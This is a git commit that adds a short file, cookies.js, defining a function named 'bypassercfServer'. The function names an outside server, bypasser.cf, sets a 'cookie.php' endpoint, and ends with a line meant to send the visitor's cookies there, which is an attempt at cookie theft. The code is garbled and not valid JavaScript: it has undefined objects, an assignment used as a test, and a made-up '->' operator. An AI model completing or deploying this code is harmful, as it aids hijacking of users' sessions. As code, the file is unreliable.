fba1b6da12921c1c9ce8ac12c49859ecf286c3dc
ubimumu <66317306+ubimumu@users.noreply.github.com>
2021-07-30 23:33:07 +0300

    Create cookies.js

---
+++ cookies.js
@@ -0,0 +1,13 @@
+  function bypassercfServer(){
+  var ping = this.server.send;
+  var server = "https://bypasser.cf/";
+  var status = "1";
+   
+   
+  if (server.status = 0){
+    alert("Server Offline?! Try again.");
+   } else
+    ping.server.status = true;
+    this.server = "https://bypasser.cf/cookie.php";
+    log.cookies.to -> server;;
+  }
